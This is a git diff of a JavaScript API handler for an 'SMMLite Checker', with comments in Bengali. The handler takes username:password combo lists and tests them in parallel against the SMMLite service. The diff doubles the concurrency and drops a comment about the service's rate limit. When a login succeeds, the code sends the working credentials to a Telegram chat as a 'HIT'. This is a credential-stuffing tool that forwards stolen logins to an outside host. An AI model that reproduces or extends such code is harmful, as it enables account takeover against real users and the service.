@@ -1,9 +1,8 @@
-// api/check.js – SMMLite Checker with parallel batch processing
+// api/check.js – SMMLite Checker with parallel batch processing (for website)
 import { checkAccount } from '../lib/checkCore.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
-// একসাথে কয়টি অ্যাকাউন্ট চেক করবে (SMMLite-এর রেট লিমিটের জন্য ৫টি নিরাপদ)
-const CONCURRENCY = 5;
+const CONCURRENCY = 10; // ওয়েবসাইটের জন্য ১০টি প্যারালাল
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -12,8 +11,8 @@ export default async function handler(req, res) {
 
   const { username, password, combos, testOnly } = req.body;
 
-  // ===== TEST MODE (Telegram connection) =====
   if (testOnly) {
+    // ... (test mode code – আগের মতো)
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       return res.status(200).json({ success: false, error: 'Bot token or chat ID missing' });
     }
@@ -40,15 +39,11 @@ export default async function handler(req, res) {
     }
   }
 
-  // ===== BATCH CHECK (যখন একাধিক কম্বো আসে) =====
+  // ===== BATCH CHECK (ওয়েবসাইট থেকে একাধিক কম্বো এলে) =====
   if (combos && Array.isArray(combos) && combos.length > 0) {
     const results = [];
-
-    // ব্যাচে ভাগ করা (CONCURRENCY অনুযায়ী)
     for (let i = 0; i < combos.length; i += CONCURRENCY) {
       const chunk = combos.slice(i, i + CONCURRENCY);
-
-      // প্যারালালে চেক করা
       const chunkResults = await Promise.all(
         chunk.map(async (combo) => {
           const [user, pass] = combo.split(':');
@@ -59,21 +54,18 @@ export default async function handler(req, res) {
           return { combo, ...result };
         })
       );
-
       results.push(...chunkResults);
     }
-
     return res.status(200).json({ results });
   }
 
-  // ===== SINGLE CHECK (পুরনো পদ্ধতি – ওয়েবসাইটের জন্য) =====
+  // ===== SINGLE CHECK =====
   if (!username || !password) {
     return res.status(400).json({ error: 'Missing username or password' });
   }
 
   const result = await checkAccount(username, password);
 
-  // Auto-post to Telegram if HIT
   if (result.hit && TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
     const message = `🎯 *HIT on SMMLite By @shakib2016*\n\n` +
                     `👤 *Username:* ${username}\n` +
